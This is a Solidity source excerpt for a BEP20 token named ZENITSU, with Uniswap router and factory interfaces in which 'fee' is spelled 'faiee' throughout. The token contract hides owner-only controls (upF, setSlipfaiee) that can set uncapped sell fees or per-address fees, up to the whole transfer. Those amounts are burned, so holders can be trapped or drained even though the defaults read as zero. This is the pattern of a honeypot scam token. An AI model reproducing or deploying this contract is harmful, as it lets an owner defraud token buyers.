...
interface IUniswapV2Factory {
    ...
    function faieeTo() external view returns (address);
    function faieeToSetter() external view returns (address);
    ...
    function setfaieeTo(address) external;
    function setfaieeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfaieeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfaieeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfaieeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfaieeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfaieeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract ZENITSU is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfaiee = 0;

    uint256 private _defaultBuyfaiee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfaiee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfaiee = _value;
    }

    function setSlipfaiee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfaiee[_address] = _value;
    }

    function getSlipfaiee(address _address) external view onlyownar returns (uint256) {
        return _slipfaiee[_address];
    }


    function setMAccountfaiee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfaiee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefaieeAmount = 0;

        if (rF) {
            uint256 tradefaiee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefaiee = _defaultSellfaiee;
                }
                if (from == uniswapV2Pair) {

                    tradefaiee = _defaultBuyfaiee;
                }
            }
            if (_slipfaiee[from] > 0) {
                tradefaiee = _slipfaiee[from];
            }

            tradefaieeAmount = _Amount.mul(tradefaiee).div(100);
        }


        if (tradefaieeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefaieeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefaieeAmount);
            emit Transfer(from, _deadAddress, tradefaieeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefaieeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefaieeAmount);
        emit Transfer(from, _to, _Amount - tradefaieeAmount);
    }
